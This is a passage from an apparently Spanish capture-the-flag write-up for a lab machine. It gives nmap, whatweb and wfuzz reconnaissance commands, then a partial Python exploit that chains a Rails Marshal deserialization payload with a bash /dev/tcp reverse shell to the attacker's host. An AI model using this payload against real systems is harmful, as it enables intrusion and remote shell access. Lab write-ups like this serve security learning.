&lt;ul&gt;
  &lt;li&gt;En caso de contar con un escaneo inicial lento, suelo aplicar la siguiente variante&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;nmap &lt;span class=&quot;nt&quot;&gt;-A&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-T4&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt; 10.10.10.211 &lt;span class=&quot;nt&quot;&gt;-oN&lt;/span&gt; misc
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Este escaneo no engloba todos los puertos, y probablemente nos estemos saltando algunos interesantes que escapen de este escaneo. En tal caso podemos ir englobando rangos de búsqueda a fin de determinar los puertos que están abiertos (Pues lanzando el -p- cuando se demora mucho tiempo nmap suele detener el escaneo haciéndolo incompleto):&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;nmap &lt;span class=&quot;nt&quot;&gt;-p1-10000&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--open&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-T5&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt; ipHost &lt;span class=&quot;nt&quot;&gt;-n&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-oG&lt;/span&gt; range1-10000
nmap &lt;span class=&quot;nt&quot;&gt;-p10000-20000&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--open&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-T5&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt; ipHost &lt;span class=&quot;nt&quot;&gt;-n&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-oG&lt;/span&gt; range10000-20000
nmap &lt;span class=&quot;nt&quot;&gt;-p20000-30000&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--open&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-T5&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt; ipHost &lt;span class=&quot;nt&quot;&gt;-n&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-oG&lt;/span&gt; range20000-30000
                        &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
                        &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
                        &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;En caso de figurar un servicio HTTP corriendo bajo un puerto, podemos aprovecharnos del script http-enum.nse de nmap para enumerar directorios y archivos del servicio web (Cuenta con un diccionario pequeño pero nos puede servir para tener una visual rápida sobre los recursos alojados):&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;nmap &lt;span class=&quot;nt&quot;&gt;--script&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;http-enum.nse &lt;span class=&quot;nt&quot;&gt;-p80&lt;/span&gt;,443,8080 10.10.10.211 &lt;span class=&quot;nt&quot;&gt;-oN&lt;/span&gt; webScan
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;ul&gt;
  &lt;li&gt;Visualización de categorías para los scripts de nmap&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;grep&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-r&lt;/span&gt; categories /usr/share/nmap/scripts/&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;.nse | &lt;span class=&quot;nb&quot;&gt;grep&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-oP&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'&quot;.*?&quot;'&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;sort&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Estas categorías son todas las que nmap posee, pudiendo por ejemplo para un servicio FTP o SMB aplicar las siguientes categorías:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;nmap &lt;span class=&quot;nt&quot;&gt;-p21&lt;/span&gt;,445 &lt;span class=&quot;nt&quot;&gt;--script&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;vuln and safe&quot;&lt;/span&gt; 10.10.10.211 &lt;span class=&quot;nt&quot;&gt;-oN&lt;/span&gt; vulnSafeScan
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;nmap &lt;span class=&quot;nt&quot;&gt;--min-rate&lt;/span&gt; 5000 &lt;span class=&quot;nt&quot;&gt;--open&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-vvv&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-n&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-Pn&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-p-&lt;/span&gt; 10.10.10.211 &lt;span class=&quot;nt&quot;&gt;-oG&lt;/span&gt; allPorts
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p align=&quot;center&quot;&gt;
&lt;img src=&quot;/assets/images/jewel/nmap2.png&quot; /&gt;
&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;extractPorts allPorts
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;which extratPorts
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;nmap &lt;span class=&quot;nt&quot;&gt;-sC&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-sV&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-p8080&lt;/span&gt; 10.10.10.211 &lt;span class=&quot;nt&quot;&gt;-oN&lt;/span&gt; targeted
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;whatweb http://10.10.10.211:8080 2&amp;gt;/dev/null
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;nmap &lt;span class=&quot;nt&quot;&gt;--script&lt;/span&gt; http-enum &lt;span class=&quot;nt&quot;&gt;-p8080&lt;/span&gt; 10.10.10.211 &lt;span class=&quot;nt&quot;&gt;-oN&lt;/span&gt; webScan
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;wfuzz &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--hc&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;404 &lt;span class=&quot;nt&quot;&gt;-w&lt;/span&gt; /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://10.10.10.211:8080/FUZZ
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;conseguir-el-web-server&quot;&gt;Conseguir el &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;web server&lt;/code&gt;&lt;/h2&gt;
&lt;p&gt;Script en python para conseguir &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Shell&lt;/code&gt;&lt;/p&gt;

&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;requests&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;re&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;sys&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;URL&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'http://{}:8080'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;format&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sys&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;username&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'myuser4'&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;password&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'mypass4'&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;email&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'myuser4@mail.com'&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sys&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;specify target IP, your IP and port: python3 rev.py 10.10.xx.xx 9001&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;nb&quot;&gt;exit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;requests&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Session&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;resp&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;get&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;URL&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'/signup'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;rx&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;r'token&quot; content=&quot;(.*)&quot;'&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;token&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;re&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;search&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;rx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;resp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;text&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;group&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;c1&quot;&gt;# create user
&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{}&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'utf8'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'â'&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'authenticity_token'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;token&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'user[username]'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;username&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'user[email]'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;email&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'user[password]'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;password&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'commit'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'Create User'&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;resp&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;post&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;URL&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'/users'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;c1&quot;&gt;# login
&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{}&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'utf8'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'â'&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'authenticity_token'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;token&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'session[email]'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;email&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'session[password]'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;password&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'commit'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'Log in'&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;resp&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;post&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;URL&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'/login'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;rx&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;r'href=&quot;/users/(.*)&quot;'&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;user_id&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;re&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;search&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;rx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;resp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;text&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;group&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;c1&quot;&gt;# rev shell
&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;rev&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;bash -c 'bash -i &amp;gt;&amp;amp; /dev/tcp/{}/{} 0&amp;gt;&amp;amp;1'&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;format&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sys&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sys&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x04\x08&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;o&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x3A\x40&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;ActiveSupport&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x3A\x3A&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;Deprecation&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x3A\x3A&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;DeprecatedInstanceVariableProxy'&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x09\x3A\x0E\x40&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;instanceo&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x3A\x08&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;ERB&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x08\x3A\x09\x40&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;srcI&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x22&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'{}&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x60&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;{}&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x60&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;format&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;chr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;rev&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;7&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;rev&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x06\x3A\x06&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;ET&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x3A\x0E\x40&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;filenameI&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x22\x06&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x06\x3B\x09&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;T&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x3A\x0C\x40&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;linenoi&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x06\x3A\x0C\x40&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;method&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x3A&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x0B&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;result&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x3A\x09\x40&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;varI&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x22\x0C\x40&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;result&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x06\x3B\x09&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;T&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x3A\x10\x40&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;deprecatorIu&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x3A\x1F&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'ActiveSupport&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x3A\x3A&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;Deprecation&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x00\x06\x3B\x09&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;T'&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{}&lt;/span&gt;
